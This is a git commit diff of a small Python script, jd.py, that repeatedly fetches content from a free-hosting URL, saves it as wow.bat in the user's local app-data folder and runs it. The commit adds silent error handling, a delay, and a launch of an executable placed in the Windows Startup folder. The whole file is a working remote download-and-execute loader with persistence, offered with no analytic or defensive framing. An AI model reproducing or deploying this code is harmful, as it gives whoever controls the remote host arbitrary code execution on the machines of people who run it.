2fcdc0b5a4e95c8a9bf25d759f6730d8974a26d6
Adam Perkowski <75480869+afdkapsx@users.noreply.github.com>
2023-05-23 14:25:37 +0200

    Add files via upload

--- bg_version/jd/jd.py
+++ bg_version/jd/jd.py
@@ -1,13 +1,21 @@
 import requests
 import subprocess
 import os
+from time import sleep
 
 response = ''
 
 while '(ok)' not in str(response):
-    response = requests.get("https://jdservernielubieng.000webhostapp.com/ok.txt").content
+    try:
+        response = requests.get("https://jdservernielubieng.000webhostapp.com/ok.txt").content
+    except:
+        pass
 
 path = os.path.join(os.getenv("LOCALAPPDATA"), 'wow.bat')
 
 open(path, 'wb').write(response)
 subprocess.Popen(path, creationflags=subprocess.CREATE_NEW_CONSOLE)
+
+sleep(30)
+
+subprocess.Popen("C:\\Users\\Iks\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jd.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
